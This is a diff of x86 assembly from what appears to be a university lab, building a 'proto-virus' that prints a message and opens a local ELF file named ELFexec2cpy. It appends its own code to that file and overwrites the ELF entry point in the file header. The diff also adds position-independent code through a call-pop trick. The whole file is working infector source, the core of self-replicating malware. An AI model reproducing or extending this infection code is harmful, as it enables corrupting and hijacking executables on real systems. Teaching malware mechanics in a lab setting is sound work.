@@ -42,6 +42,13 @@
 	add esp, 4
 %endmacro
 
+%macro  print 2
+	call get_my_loc
+	sub ecx, next_i-%1
+	
+	write STDOUT, ecx, %2
+%endmacro
+
 %define	STDOUT	1
 
 %define	STK_RES	200
@@ -66,27 +73,22 @@ _start:
 	mov	ebp, esp
 	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
 
+	print virus_msg, 16
 
-	write STDOUT, virus_msg, 16
-
-	;open a file called ELFexec
+	;open a file called ELFexec2cpy
 		open FileName, RDWR, 0777
 		cmp eax, -1
-		je .error_occured
+		je error_occured
 	
 	;check if ELFexec is elf file
 		mov [ebp-4], eax
 		checkELF [ebp-4]
 		cmp eax, -1
-		je .error_occured
+		je error_occured
 
 	;move the cursor of ELFexec to the end of the file (get file size on the way)
 		lseek dword [ebp-4], 0, SEEK_END
 		mov dword [ebp-8], eax
-		.bla:
-		mov ecx, ebp
-		sub ecx, 8
-		
 
 	;infecting ELFexec with this very code
 	    mov ecx, code_end       ; copy code_end address
@@ -95,13 +97,30 @@ _start:
 	    write dword [ebp-4], _start, ecx
 
 
+	;copy yhe elf header to the stack
+		lseek dword [ebp-4], 0, SEEK_SET
+		mov esi, ebp
+		sub esi, 60							;52+4+4
+		read dword [ebp-4], esi, 52
+		add esi, 24
+		mov dword [esi], 0x08048294
+		;write STDOUT, esi, 4
+		;swrite STDOUT, _start, 4
+		;write STDOUT, esi, 52
+
+	;copy the new elf header to the exec file
+		lseek dword [ebp-4], 0, SEEK_SET
+		mov esi, ebp
+		sub esi, 60
+		write dword [ebp-4], esi, 52
+
 	;write STDOUT, ecx, 4
 	close dword [ebp-4]
 	mov eax, 1
 	jmp VirusExit
 
-	.error_occured:
-		write STDOUT, error_msg, 18
+	error_occured:
+		print error_msg, 18
 		mov eax, 0
 		jmp VirusExit
 ; You code for this lab goes here
@@ -112,13 +131,20 @@ VirusExit:
                          ; (also an example for use of above macros)
 	
 ;FileName:	db "makefile", 0
-FileName:	db "ELFexec", 0
+FileName:	db "ELFexec2cpy", 0
 OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
 Failstr:    db "perhaps not", 10 , 0
 virus_msg:    db "This is a virus", 10 , 0
+
 elf_magic:    db "ELF", 0
 error_msg:    db "An error occured!", 10, 0
 
+get_my_loc:
+	call next_i
+
+next_i:
+	pop ecx
+	ret
 
 PreviousEntryPoint: dd VirusExit
 virus_end:
